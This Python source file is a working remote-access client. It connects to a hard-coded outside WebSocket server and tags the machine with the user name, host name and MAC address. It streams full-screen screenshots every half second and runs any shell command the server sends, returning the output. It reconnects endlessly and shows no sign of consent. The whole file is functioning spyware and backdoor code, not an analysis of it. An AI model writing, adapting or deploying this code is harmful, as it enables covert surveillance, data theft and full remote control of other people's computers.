import websocket
import threading
import subprocess
import base64
import io
import json
import socket
import os
import time
from PIL import Image
import mss
import getpass
import queue
import uuid

SERVER_URL = "wss://hihat.squareweb.app"
CLIENT_ID = f"{getpass.getuser()}@{socket.gethostname()}_{uuid.getnode()}"
send_queue = queue.Queue()
current_dir = os.getcwd()

def sender_loop(ws):
    while True:
        msg = send_queue.get()
        if msg == "STOP":
            break
        try:
            ws.send(msg)
        except Exception as e:
            print(f"Erro ao enviar mensagem: {e}")

def screen_loop(delay=0.5):
    with mss.mss() as sct:
        while True:
            try:
                shot = sct.grab(sct.monitors[0])
                img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                img = img.resize((1024, 576))
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=50)
                encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
                send_queue.put(json.dumps({
                    "type": "screen",
                    "id": CLIENT_ID,
                    "image": encoded
                }))
            except Exception as e:
                print(f"Erro ao capturar a tela: {e}")
            time.sleep(delay)

def handle_command(ws, cmd):
    global current_dir
    try:
        if cmd.strip().lower().startswith("cd "):
            path = cmd[3:].strip('"').strip()
            new_path = os.path.abspath(os.path.join(current_dir, path))
            if os.path.isdir(new_path):
                current_dir = new_path
                result = f"Diretório alterado: {current_dir}"
            else:
                result = f"[erro] Diretório inválido: {path}"
        else:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, cwd=current_dir)
            result = output.decode("utf-8", errors="ignore")
    except subprocess.CalledProcessError as e:
        result = e.output.decode("utf-8", errors="ignore")
    except Exception as e:
        result = str(e)

    send_queue.put(json.dumps({
        "type": "result",
        "id": CLIENT_ID,
        "output": result
    }))

def on_message(ws, message):
    try:
        data = json.loads(message)
        if data.get("command"):
            threading.Thread(target=handle_command, args=(ws, data["command"]), daemon=True).start()
    except json.JSONDecodeError as e:
        print(f"Erro ao decodificar JSON: {e}")

def on_open(ws):
    send_queue.put(json.dumps({"type": "id", "id": CLIENT_ID, "role": "client"}))
    threading.Thread(target=sender_loop, args=(ws,), daemon=True).start()
    threading.Thread(target=screen_loop, daemon=True).start()

def on_error(ws, error):
    print(f"Erro: {error}")

def on_close(ws, code, msg):
    print(f"Conexão fechada: {code}, {msg}")

def main():
    websocket.enableTrace(False)
    while True:
        try:
            ws = websocket.WebSocketApp(
                SERVER_URL,
                on_open=on_open,
                on_message=on_message,
                on_error=on_error,
                on_close=on_close
            )
            ws.run_forever()
        except Exception as e:
            print(f"Erro ao executar WebSocket: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
